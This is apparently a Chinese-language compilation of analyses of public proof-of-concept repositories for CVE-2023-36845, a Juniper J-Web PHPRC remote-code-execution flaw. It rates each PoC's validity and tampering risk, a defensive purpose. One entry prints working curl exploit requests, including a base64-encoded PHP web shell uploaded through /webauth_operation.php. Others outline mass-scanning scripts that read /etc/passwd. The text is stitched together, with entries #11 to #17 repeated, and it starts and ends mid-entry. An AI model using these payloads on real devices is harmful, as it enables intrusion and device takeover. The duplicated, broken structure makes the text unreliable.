2.  **漏洞触发：** 攻击者构造一个包含 `PHPRC` 变量的 HTTP 请求发送到目标设备的 J-Web 接口。
3.  **代码注入：** 通过 `PHPRC` 变量，攻击者可以指定一个包含恶意 PHP 代码的文件路径，从而修改 PHP 的配置。
4.  **远程代码执行：** 当 J-Web 执行 PHP 代码时，恶意代码将被执行，从而允许攻击者在目标设备上执行任意命令。
5.  **进一步利用：** 攻击者可以通过执行的命令获取系统信息、修改配置、安装后门等，从而完全控制目标设备。

**项目地址:** [kopfjager007/CVE-2023-36845](https://github.com/kopfjager007/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #15

**来源**: [CVE-2023-36845-simrotion13_CVE-2023-36845.md](../2023/CVE-2023-36845-simrotion13_CVE-2023-36845.md)

## CVE-2023-36845-Juniper-J-Web-PHP外部变量修改导致RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改

**影响应用:** Junos OS J-Web (EX系列和SRX系列)

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本请参考漏洞库信息

**利用条件:** 目标设备开启了J-Web管理界面，并且允许通过HTTP或HTTPS访问。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Juniper Junos OS的J-Web管理界面中。攻击者可以通过修改`PHPRC`环境变量，控制PHP的配置，进而执行任意代码。

**漏洞利用方式：**

1.  攻击者发送一个特制的HTTP POST请求到目标J-Web服务器。
2.  该请求包含一个`PHPRC`参数，该参数被设置为指向一个恶意PHP配置文件或包含恶意代码的文件，例如`/dev/fd/0`，并结合`auto_prepend_file`包含`/etc/passwd`。
3.  由于`PHPRC`环境变量被修改，PHP在处理后续请求时会加载攻击者提供的恶意配置。
4.  通过`auto_prepend_file`，强制包含`/etc/passwd`文件内容,以验证漏洞存在。
5. 最终导致攻击者可以远程执行任意代码。

**有效性：**

提供的PoC代码是有效的，它通过`curl`命令发送带有恶意`PHPRC`参数的请求来验证漏洞。如果目标存在漏洞，将会返回`/etc/passwd`的内容，`grep -i 'root:'` 用于检测`/etc/passwd`是否存在，从而判断目标是否漏洞。

**投毒风险：**

分析提供的PoC代码，未发现明显的投毒代码。PoC代码的功能是发送恶意请求并验证漏洞是否存在，并没有执行任何恶意操作（例如植入后门），风险等级判定为0%。


**项目地址:** [simrotion13/CVE-2023-36845](https://github.com/simrotion13/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #16

**来源**: [CVE-2023-36845-vulncheck-oss_cve-2023-36845-scanner.md](../2023/CVE-2023-36845-vulncheck-oss_cve-2023-36845-scanner.md)

## CVE-2023-36845-Junos OS-J-Web-PHP外部变量修改-远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改

**影响应用:** Junos OS J-Web

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 所有低于 20.4R3-S9 的版本；21.1 版本 21.1R1 及更高版本；21.2 版本低于 21.2R3-S7；21.3 版本低于 21.3R3-S5；21.4 版本低于 21.4R3-S5；22.1 版本低于 22.1R3-S4；22.2 版本低于 22.2R3-S2；22.3 版本低于 22.3R2-S2, 22.3R3-S1；22.4 版本低于 22.4R2-S1, 22.4R3；23.2 版本低于 23.2R1-S1, 23.2R2。

**利用条件:** 启用了 J-Web (HTTP 或 HTTPS) 的 Junos OS 设备。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 是 Juniper Networks Junos OS 中 J-Web 界面的一个 PHP 外部变量修改漏洞。未经身份验证的远程攻击者可以通过发送特制的请求，设置 `PHPRC` 变量来修改 PHP 执行环境，从而注入和执行任意代码。由于漏洞允许远程代码执行，因此风险评级为严重。

**漏洞利用方式：**

1.  攻击者发送一个特制的 HTTP 请求到易受攻击的 Junos 设备上的 J-Web 接口。
2.  此请求包含一个设置 `PHPRC` PHP 配置变量的参数。通过修改该变量，攻击者可以控制 PHP 的配置文件的路径，从而包含恶意的 PHP 代码。
3.  设备执行攻击者提供的 PHP 代码，从而允许攻击者在设备上执行任意命令。

**关于投毒风险：**

分析提供的 `Dockerfile` 和 `LICENSE` 文件，没有发现明显的恶意代码或编译过程中的可疑操作。 `Dockerfile` 只是一个简单的 Go 编译环境，`LICENSE` 是 Apache 2.0 许可。漏洞利用代码部分缺失，无法判断是否存在后门。

但是，考虑到漏洞本身允许远程代码执行，即使提供的 `Dockerfile` 和 `LICENSE` 没有直接的投毒代码，攻击者仍然可以利用该漏洞在目标系统上植入恶意软件。因此，存在一定的投毒风险，假设为10%。

**项目地址:** [vulncheck-oss/cve-2023-36845-scanner](https://github.com/vulncheck-oss/cve-2023-36845-scanner)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #17

**来源**: [CVE-2023-36845-zaenhaxor_CVE-2023-36845.md](../2023/CVE-2023-36845-zaenhaxor_CVE-2023-36845.md)

## CVE-2023-36845-Junos OS-远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改导致远程代码执行

**影响应用:** Junos OS (EX Series 和 SRX Series) J-Web

**危害等级:** 高危，未授权远程代码执行

**影响版本:** 受影响版本: 所有版本 prior to 20.4R3-S9; 21.1 versions 21.1R1 and later; 21.2 versions prior to 21.2R3-S7; 21.3 versions prior to 21.3R3-S5; 21.4 versions prior to 21.4R3-S5; 22.1 versions prior to 22.1R3-S4; 22.2 versions prior to 22.2R3-S2; 22.3 versions prior to 22.3R2-S2, 22.3R3-S1; 22.4 versions prior to 22.4R2-S1, 22.4R3; 23.2 versions prior to 23.2R1-S1, 23.2R2.

**利用条件:** 需要开启J-Web服务 (http或https)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-36845 存在于Juniper Networks Junos OS 的 J-Web 组件中。攻击者可以通过设置 `PHPRC` 环境变量来修改 PHP 运行环境，从而远程执行代码。提供的 `cve.sh` 脚本读取一个包含目标主机列表的文件，然后通过构造包含恶意 `PHPRC` 参数的 HTTP 请求，尝试在目标系统上执行代码。脚本通过检查响应中是否包含 `root:` 字符串来判断漏洞是否成功利用，这是因为脚本尝试通过 `auto_prepend_file` 包含 `/etc/passwd` 文件。 

**有效性：**
POC 代码利用了 PHP 外部变量修改漏洞，通过设置 PHPRC 环境变量来包含任意文件，从而实现远程代码执行。该方法被广泛报道，并且CISA KEV 已经收录，确定了其有效性。

**投毒风险：**
脚本本身相对简单，主要功能是发送 HTTP 请求并检查响应。 投毒风险主要体现在以下几个方面：
*   **明面上的风险：** 脚本使用 curl 命令发送请求，存在被中间人攻击的风险，导致信息泄露或者被篡改。
*   **隐藏的风险：** 虽然脚本代码较为简短，但依然存在作者在其他地方植入恶意代码的可能性，比如通过读取其他配置文件、调用外部命令等方式。但是从目前的代码来看，直接的投毒风险较低， 评估为5%。

**利用方式：**
1.  **确定目标:**  需要一个存在漏洞且开启了 J-Web 服务的 Juniper 设备。
2.  **准备攻击脚本：** 使用提供的 `cve.sh` 脚本。
3.  **构造目标列表：** 创建一个包含目标设备 IP 地址或域名的文本文件（例如 `file.txt`）。
4.  **执行攻击：** 运行 `bash cve.sh file.txt` 命令。
5.  **验证结果：** 脚本会输出哪些主机存在漏洞（`VULN`）。


**项目地址:** [zaenhaxor/CVE-2023-36845](https://github.com/zaenhaxor/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---



---

## POC #11

**来源**: [CVE-2023-36845-iveresk_CVE-2023-36845-6-.md](../2023/CVE-2023-36845-iveresk_CVE-2023-36845-6-.md)

## CVE-2023-36845 Juniper Junos OS J-Web RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Junos OS J-Web (EX and SRX Series)

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本见CVE描述：所有版本 prior to 20.4R3-S9; 21.1 versions 21.1R1 and later; 21.2 versions prior to 21.2R3-S7; 21.3 versions prior to 21.3R3-S5; 21.4 versions prior to 21.4R3-S5; 22.1 versions prior to 22.1R3-S4; 22.2 versions prior to 22.2R3-S2; 22.3 versions prior to 22.3R2-S2, 22.3R3-S1; 22.4 versions prior to 22.4R2-S1, 22.4R3; 23.2 versions prior to 23.2R1-S1, 23.2R2.

**利用条件:** 目标设备已启用 J-Web 服务 (HTTP 或 HTTPS)。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Juniper Junos OS EX 和 SRX 系列的 J-Web 组件中的一个 PHP 外部变量修改漏洞。该漏洞允许未经身份验证的远程攻击者通过构造特殊的请求来修改 PHP 的执行环境，从而实现远程代码执行。

**利用方式：**

攻击者通过设置 `PHPRC` 环境变量为 `/dev/fd/0`，并通过 `data-binary` 参数传递 PHP 代码。 由于`/dev/fd/0`代表标准输入，攻击者可以将任意PHP代码写入到标准输入中，这些代码会被作为PHP配置文件执行。 在提供的POC中，利用`auto_prepend_file`指令包含`/etc/passwd`文件，从而验证漏洞的存在。 实际的利用中，攻击者可以注入任意的恶意PHP代码，实现远程代码执行。

**有效性：**
提供的 POC 代码通过 curl 发送一个带有恶意 `PHPRC` 参数的 HTTP 请求。 该请求的目标是 `/about.php` 页面，并尝试包含 `/etc/passwd` 文件。 如果目标存在漏洞，则响应中会包含 `/etc/passwd` 的内容，证明 POC 有效。

**投毒风险：**

提供的脚本非常简单，主要功能就是发送包含恶意参数的请求。该脚本没有发现明显的投毒代码。但是，用户需要注意下载的脚本来源，防止被恶意替换。

根据现有信息，代码本身直接包含恶意代码的可能性较低。风险主要在于代码作者可能在其他地方埋藏恶意链接，或者在其他恶意软件中捆绑该脚本。 因此，判断投毒风险为0%。


**项目地址:** [iveresk/CVE-2023-36845-6-](https://github.com/iveresk/CVE-2023-36845-6-)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #12

**来源**: [CVE-2023-36845-jahithoque_Juniper-CVE-2023-36845-Mass-Hunting.md](../2023/CVE-2023-36845-jahithoque_Juniper-CVE-2023-36845-Mass-Hunting.md)

## CVE-2023-36845-Junos OS-PHP外部变量修改导致RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** 远程代码执行

**影响应用:** Junos OS (EX Series, SRX Series)

**危害等级:** 严重，允许未经身份验证的远程攻击者执行代码

**影响版本:** 受影响版本包括但不限于：20.4R3-S9之前的所有版本，21.1，21.2R3-S7之前的所有版本，21.3R3-S5之前的所有版本，21.4R3-S5之前的所有版本，22.1R3-S4之前的所有版本，22.2R3-S2之前的所有版本，22.3R2-S2, 22.3R3-S1之前的所有版本，22.4R2-S1, 22.4R3之前的所有版本，23.2R1-S1, 23.2R2之前的所有版本。

**利用条件:** 需要开启J-Web，且可以通过网络访问J-Web服务 (http 或 https)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Juniper Networks Junos OS 的 J-Web 组件中的一个 PHP 外部变量修改漏洞。攻击者可以通过构造恶意请求，设置 `PHPRC` 环境变量来修改 PHP 的执行环境，从而注入并执行任意代码。

**漏洞利用方式：**

1.  **攻击向量：** 网络
2.  **攻击条件：** 目标设备必须运行受影响版本的 Junos OS，并且启用了 J-Web 管理界面 (http 或 https)。
3.  **漏洞原理：** 通过 `PHPRC` 环境变量，指定一个包含恶意 PHP 代码的文件。由于 J-Web 对该变量的过滤不严，导致 PHP 在执行时会加载并执行该文件，从而实现远程代码执行。
4.  **POC 分析：** 提供的 `Juniper-RCE-Check.sh` 脚本通过发送包含恶意 `PHPRC` 参数的 HTTP 请求到 `/about.php` 页面，其中PHPRC的值被设置为 `/dev/fd/0`，并使用`auto_prepend_file` 尝试将 `/etc/passwd` 的内容包含到响应中。如果响应中包含 `root:` 字符串，则表示目标存在漏洞，攻击者可以利用此漏洞执行任意代码。

**投毒风险分析：**

提供的 `Juniper-RCE-Check.sh` 脚本的功能是检测目标是否存在 CVE-2023-36845 漏洞，而不是进行漏洞利用或植入后门。该脚本只是通过 `curl` 命令发送一个 HTTP 请求，并检查响应的内容。其中使用的`/etc/passwd`只是用于验证，并不会对目标系统造成永久性影响。LICENSE文件也是标准的Creative Commons协议。

**有效性：**
根据漏洞库信息和提供的POC脚本，可以确定该漏洞利用是有效的。POC脚本验证了通过修改`PHPRC`环境变量，攻击者能够控制PHP的执行，从而读取敏感文件 (例如 `/etc/passwd`)。结合漏洞描述，可以推断出利用该漏洞执行任意代码是可行的。

**结论：**
该漏洞为高危漏洞，利用简单，影响范围广。强烈建议受影响的用户及时升级到安全版本。

**项目地址:** [jahithoque/Juniper-CVE-2023-36845-Mass-Hunting](https://github.com/jahithoque/Juniper-CVE-2023-36845-Mass-Hunting)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #13

**来源**: [CVE-2023-36845-kljunowsky_CVE-2023-36845.md](../2023/CVE-2023-36845-kljunowsky_CVE-2023-36845.md)

## CVE-2023-36845-Juniper Junos OS J-Web PHP 外部变量修改 RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Juniper Junos OS J-Web

**危害等级:** 严重，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本请参考漏洞库信息

**利用条件:** 目标设备开启 J-Web 服务，且运行于受影响的 Junos OS 版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 漏洞存在于 Juniper Networks Junos OS 的 J-Web 界面中。未经身份验证的攻击者可以通过修改 PHP 的 `PHPRC` 环境变量，从而控制 PHP 的执行环境，最终实现远程代码执行。

**漏洞利用方式：**

1.  **利用 PHPRC 变量:** 攻击者发送特制的 HTTP 请求，其中包含 `PHPRC` 参数，将其指向一个可控的文件描述符 `/dev/fd/0`。利用`auto_prepend_file`参数，加载恶意代码，例如使用 `data://` 协议嵌入经过 base64 编码的 PHP 代码。简单的例子就是读取/etc/passwd 文件进行漏洞验证。

```
curl "http://target.tld/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'
```
2.  **上传文件:**  攻击者可以通过 `/webauth_operation.php` 接口上传包含恶意代码的 PHP 文件，然后通过访问该文件执行恶意代码。
```
$ curl http://target.tld/webauth_operation.php -d 'rs=do_upload&rsargs[]=[{"fileName": "shell.php", "fileData": ",PD9waHAgaWYoaXNzZXQoJF9SRVFVRVNUW2NtZF0pKXsgZWNobyAiPHByZT4iOyAkY21kID0gKCRfUkVRVUVTVFtjbWRdKTsgc3lzdGVtKCRjbWQpOyBlY2hvICI8L3ByZT4iOyBkaWU7IH0/Pgo=\n", "csize": 110}]'
```

**投毒风险分析：**

提供的漏洞利用代码主要用于检测漏洞是否存在，通过读取 `/etc/passwd` 文件进行验证。虽然此行为本身不属于投毒，但如果攻击者利用此代码大规模扫描网络，可能会引起目标系统的注意。

RCE 的方法演示中，利用 `data://` 协议执行任意 PHP 代码，存在一定的风险，攻击者可以利用此方法植入后门代码。上传文件的攻击利用方式，需要找到对应的上传点，并绕过文件上传限制，复杂性较高。

LICENSE文件为MIT许可证，相对安全。
README.md文件提供了Shodan搜索方法和利用方式，整体风险较低，但存在被恶意利用的可能。综合考虑，投毒风险评估为10%。CISA已将此漏洞加入到已知被利用的漏洞目录，证明该漏洞已经被恶意利用。


**项目地址:** [kljunowsky/CVE-2023-36845](https://github.com/kljunowsky/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #14

**来源**: [CVE-2023-36845-kopfjager007_CVE-2023-36845.md](../2023/CVE-2023-36845-kopfjager007_CVE-2023-36845.md)

## CVE-2023-36845

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Juniper Junos OS J-Web

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本见漏洞库信息

**利用条件:** 目标设备开启 J-Web (http 或 https)

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 是一个 Juniper Junos OS EX 系列和 SRX 系列设备 J-Web 组件中的 PHP 外部变量修改漏洞。未经身份验证的远程攻击者可以通过构造恶意请求设置 PHPRC 变量来修改 PHP 执行环境，从而注入并执行任意代码。

**有效性评估：**
根据漏洞库信息，该漏洞是真实存在的，CVSS 评分为 9.8 (Critical)，表明危害程度很高。CISA 已将其添加到已知被利用漏洞目录中，进一步表明该漏洞已被积极利用。

**投毒风险评估：**
提供的漏洞利用代码只是一个包含 README.md 文件的目录。README.md 文件仅包含漏洞名称和简短描述，没有实际的利用代码。因此，该代码本身不存在直接的投毒风险。

但是，需要注意的是，攻击者可能会在其他地方发布包含恶意代码的利用程序，伪装成 CVE-2023-36845 的利用程序。因此，在下载和使用任何利用代码时，都应该进行仔细审查，确保代码的安全性。
由于缺少实际的代码，无法进行更详细的分析，投毒风险评估相对保守。

**利用方式：**
1.  **前提条件：** 目标 Juniper 设备运行受影响的 Junos OS 版本，并且启用了 J-Web 服务（通过 HTTP 或 HTTPS）。
2.  **漏洞触发：** 攻击者构造一个包含 `PHPRC` 变量的 HTTP 请求发送到目标设备的 J-Web 接口。
3.  **代码注入：** 通过 `PHPRC` 变量，攻击者可以指定一个包含恶意 PHP 代码的文件路径，从而修改 PHP 的配置。
4.  **远程代码执行：** 当 J-Web 执行 PHP 代码时，恶意代码将被执行，从而允许攻击者在目标设备上执行任意命令。
5.  **进一步利用：** 攻击者可以通过执行的命令获取系统信息、修改配置、安装后门等，从而完全控制目标设备。

**项目地址:** [kopfjager007/CVE-2023-36845](https://github.com/kopfjager007/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #15

**来源**: [CVE-2023-36845-simrotion13_CVE-2023-36845.md](../2023/CVE-2023-36845-simrotion13_CVE-2023-36845.md)

## CVE-2023-36845-Juniper-J-Web-PHP外部变量修改导致RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改

**影响应用:** Junos OS J-Web (EX系列和SRX系列)

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本请参考漏洞库信息

**利用条件:** 目标设备开启了J-Web管理界面，并且允许通过HTTP或HTTPS访问。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Juniper Junos OS的J-Web管理界面中。攻击者可以通过修改`PHPRC`环境变量，控制PHP的配置，进而执行任意代码。

**漏洞利用方式：**

1.  攻击者发送一个特制的HTTP POST请求到目标J-Web服务器。
2.  该请求包含一个`PHPRC`参数，该参数被设置为指向一个恶意PHP配置文件或包含恶意代码的文件，例如`/dev/fd/0`，并结合`auto_prepend_file`包含`/etc/passwd`。
3.  由于`PHPRC`环境变量被修改，PHP在处理后续请求时会加载攻击者提供的恶意配置。
4.  通过`auto_prepend_file`，强制包含`/etc/passwd`文件内容,以验证漏洞存在。
5. 最终导致攻击者可以远程执行任意代码。

**有效性：**

提供的PoC代码是有效的，它通过`curl`命令发送带有恶意`PHPRC`参数的请求来验证漏洞。如果目标存在漏洞，将会返回`/etc/passwd`的内容，`grep -i 'root:'` 用于检测`/etc/passwd`是否存在，从而判断目标是否漏洞。

**投毒风险：**

分析提供的PoC代码，未发现明显的投毒代码。PoC代码的功能是发送恶意请求并验证漏洞是否存在，并没有执行任何恶意操作（例如植入后门），风险等级判定为0%。


**项目地址:** [simrotion13/CVE-2023-36845](https://github.com/simrotion13/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #16

**来源**: [CVE-2023-36845-vulncheck-oss_cve-2023-36845-scanner.md](../2023/CVE-2023-36845-vulncheck-oss_cve-2023-36845-scanner.md)

## CVE-2023-36845-Junos OS-J-Web-PHP外部变量修改-远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改

**影响应用:** Junos OS J-Web

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 所有低于 20.4R3-S9 的版本；21.1 版本 21.1R1 及更高版本；21.2 版本低于 21.2R3-S7；21.3 版本低于 21.3R3-S5；21.4 版本低于 21.4R3-S5；22.1 版本低于 22.1R3-S4；22.2 版本低于 22.2R3-S2；22.3 版本低于 22.3R2-S2, 22.3R3-S1；22.4 版本低于 22.4R2-S1, 22.4R3；23.2 版本低于 23.2R1-S1, 23.2R2。

**利用条件:** 启用了 J-Web (HTTP 或 HTTPS) 的 Junos OS 设备。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 是 Juniper Networks Junos OS 中 J-Web 界面的一个 PHP 外部变量修改漏洞。未经身份验证的远程攻击者可以通过发送特制的请求，设置 `PHPRC` 变量来修改 PHP 执行环境，从而注入和执行任意代码。由于漏洞允许远程代码执行，因此风险评级为严重。

**漏洞利用方式：**

1.  攻击者发送一个特制的 HTTP 请求到易受攻击的 Junos 设备上的 J-Web 接口。
2.  此请求包含一个设置 `PHPRC` PHP 配置变量的参数。通过修改该变量，攻击者可以控制 PHP 的配置文件的路径，从而包含恶意的 PHP 代码。
3.  设备执行攻击者提供的 PHP 代码，从而允许攻击者在设备上执行任意命令。

**关于投毒风险：**

分析提供的 `Dockerfile` 和 `LICENSE` 文件，没有发现明显的恶意代码或编译过程中的可疑操作。 `Dockerfile` 只是一个简单的 Go 编译环境，`LICENSE` 是 Apache 2.0 许可。漏洞利用代码部分缺失，无法判断是否存在后门。

但是，考虑到漏洞本身允许远程代码执行，即使提供的 `Dockerfile` 和 `LICENSE` 没有直接的投毒代码，攻击者仍然可以利用该漏洞在目标系统上植入恶意软件。因此，存在一定的投毒风险，假设为10%。

**项目地址:** [vulncheck-oss/cve-2023-36845-scanner](https://github.com/vulncheck-oss/cve-2023-36845-scanner)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #17

**来源**: [CVE-2023-36845-zaenhaxor_CVE-2023-36845.md](../2023/CVE-2023-36845-zaenhaxor_CVE-2023-36845.md)

## CVE-2023-36845-Junos OS-远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改导致远程代码执行

**影响应用:** Junos OS (EX Series 和 SRX Series) J-Web

**危害等级:** 高危，未授权远程代码执行

**影响版本:** 受影响版本: 所有版本 prior to 20.4R3-S9; 21.1 versions 21.1R1 and later; 21.2 versions prior to 21.2R3-S7; 21.3 versions prior to 21.3R3-S5; 21.4 versions prior to 21.4R3-S5; 22.1 versions prior to 22.1R3-S4; 22.2 versions prior to 22.2R3-S2; 22.3 versions prior to 22.3R2-S2, 22.3R3-S1; 22.4 versions prior to 22.4R2-S1, 22.4R3; 23.2 versions prior to 23.2R1-S1, 23.2R2.

**利用条件:** 需要开启J-Web服务 (http或https)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-36845 存在于Juniper Networks Junos OS 的 J-Web 组件中。攻击者可以通过设置 `PHPRC` 环境变量来修改 PHP 运行环境，从而远程执行代码。提供的 `cve.sh` 脚本读取一个包含目标主机列表的文件，然后通过构造包含恶意 `PHPRC` 参数的 HTTP 请求，尝试在目标系统上执行代码。脚本通过检查响应中是否包含 `root:` 字符串来判断漏洞是否成功利用，这是因为脚本尝试通过 `auto_prepend_file` 包含 `/etc/passwd` 文件。 

**有效性：**
POC 代码利用了 PHP 外部变量修改漏洞，通过设置 PHPRC 环境变量来包含任意文件，从而实现远程代码执行。该方法被广泛报道，并且CISA KEV 已经收录，确定了其有效性。

**投毒风险：**
脚本本身相对简单，主要功能是发送 HTTP 请求并检查响应。 投毒风险主要体现在以下几个方面：
*   **明面上的风险：** 脚本使用 curl 命令发送请求，存在被中间人攻击的风险，导致信息泄露或者被篡改。
*   **隐藏的风险：** 虽然脚本代码较为简短，但依然存在作者在其他地方植入恶意代码的可能性，比如通过读取其他配置文件、调用外部命令等方式。但是从目前的代码来看，直接的投毒风险较低， 评估为5%。

**利用方式：**
1.  **确定目标:**  需要一个存在漏洞且开启了 J-Web 服务的 Juniper 设备。
2.  **准备攻击脚本：** 使用提供的 `cve.sh` 脚本。
3.  **构造目标列表：** 创建一个包含目标设备 IP 地址或域名的文本文件（例如 `file.txt`）。
4.  **执行攻击：** 运行 `bash cve.sh file.txt` 命令。
5.  **验证结果：** 脚本会输出哪些主机存在漏洞（`VULN`）。


**项目地址:** [zaenhaxor/CVE-2023-36845](https://github.com/zaenhaxor/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---



---

## POC #11

**来源**: [CVE-2023-36845-iveresk_CVE-2023-36845-6-.md](../2023/CVE-2023-36845-iveresk_CVE-2023-36845-6-.md)

## CVE-2023-36845 Juniper Junos OS J-Web RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Junos OS J-Web (EX and SRX Series)

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本见CVE描述：所有版本 prior to 20.4R3-S9; 21.1 versions 21.1R1 and later; 21.2 versions prior to 21.2R3-S7; 21.3 versions prior to 21.3R3-S5; 21.4 versions prior to 21.4R3-S5; 22.1 versions prior to 22.1R3-S4; 22.2 versions prior to 22.2R3-S2; 22.3 versions prior to 22.3R2-S2, 22.3R3-S1; 22.4 versions prior to 22.4R2-S1, 22.4R3; 23.2 versions prior to 23.2R1-S1, 23.2R2.

**利用条件:** 目标设备已启用 J-Web 服务 (HTTP 或 HTTPS)。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Juniper Junos OS EX 和 SRX 系列的 J-Web 组件中的一个 PHP 外部变量修改漏洞。该漏洞允许未经身份验证的远程攻击者通过构造特殊的请求来修改 PHP 的执行环境，从而实现远程代码执行。

**利用方式：**

攻击者通过设置 `PHPRC` 环境变量为 `/dev/fd/0`，并通过 `data-binary` 参数传递 PHP 代码。 由于`/dev/fd/0`代表标准输入，攻击者可以将任意PHP代码写入到标准输入中，这些代码会被作为PHP配置文件执行。 在提供的POC中，利用`auto_prepend_file`指令包含`/etc/passwd`文件，从而验证漏洞的存在。 实际的利用中，攻击者可以注入任意的恶意PHP代码，实现远程代码执行。

**有效性：**
提供的 POC 代码通过 curl 发送一个带有恶意 `PHPRC` 参数的 HTTP 请求。 该请求的目标是 `/about.php` 页面，并尝试包含 `/etc/passwd` 文件。 如果目标存在漏洞，则响应中会包含 `/etc/passwd` 的内容，证明 POC 有效。

**投毒风险：**

提供的脚本非常简单，主要功能就是发送包含恶意参数的请求。该脚本没有发现明显的投毒代码。但是，用户需要注意下载的脚本来源，防止被恶意替换。

根据现有信息，代码本身直接包含恶意代码的可能性较低。风险主要在于代码作者可能在其他地方埋藏恶意链接，或者在其他恶意软件中捆绑该脚本。 因此，判断投毒风险为0%。


**项目地址:** [iveresk/CVE-2023-36845-6-](https://github.com/iveresk/CVE-2023-36845-6-)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #12

**来源**: [CVE-2023-36845-jahithoque_Juniper-CVE-2023-36845-Mass-Hunting.md](../2023/CVE-2023-36845-jahithoque_Juniper-CVE-2023-36845-Mass-Hunting.md)

## CVE-2023-36845-Junos OS-PHP外部变量修改导致RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** 远程代码执行

**影响应用:** Junos OS (EX Series, SRX Series)

**危害等级:** 严重，允许未经身份验证的远程攻击者执行代码

**影响版本:** 受影响版本包括但不限于：20.4R3-S9之前的所有版本，21.1，21.2R3-S7之前的所有版本，21.3R3-S5之前的所有版本，21.4R3-S5之前的所有版本，22.1R3-S4之前的所有版本，22.2R3-S2之前的所有版本，22.3R2-S2, 22.3R3-S1之前的所有版本，22.4R2-S1, 22.4R3之前的所有版本，23.2R1-S1, 23.2R2之前的所有版本。

**利用条件:** 需要开启J-Web，且可以通过网络访问J-Web服务 (http 或 https)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Juniper Networks Junos OS 的 J-Web 组件中的一个 PHP 外部变量修改漏洞。攻击者可以通过构造恶意请求，设置 `PHPRC` 环境变量来修改 PHP 的执行环境，从而注入并执行任意代码。

**漏洞利用方式：**

1.  **攻击向量：** 网络
2.  **攻击条件：** 目标设备必须运行受影响版本的 Junos OS，并且启用了 J-Web 管理界面 (http 或 https)。
3.  **漏洞原理：** 通过 `PHPRC` 环境变量，指定一个包含恶意 PHP 代码的文件。由于 J-Web 对该变量的过滤不严，导致 PHP 在执行时会加载并执行该文件，从而实现远程代码执行。
4.  **POC 分析：** 提供的 `Juniper-RCE-Check.sh` 脚本通过发送包含恶意 `PHPRC` 参数的 HTTP 请求到 `/about.php` 页面，其中PHPRC的值被设置为 `/dev/fd/0`，并使用`auto_prepend_file` 尝试将 `/etc/passwd` 的内容包含到响应中。如果响应中包含 `root:` 字符串，则表示目标存在漏洞，攻击者可以利用此漏洞执行任意代码。

**投毒风险分析：**

提供的 `Juniper-RCE-Check.sh` 脚本的功能是检测目标是否存在 CVE-2023-36845 漏洞，而不是进行漏洞利用或植入后门。该脚本只是通过 `curl` 命令发送一个 HTTP 请求，并检查响应的内容。其中使用的`/etc/passwd`只是用于验证，并不会对目标系统造成永久性影响。LICENSE文件也是标准的Creative Commons协议。

**有效性：**
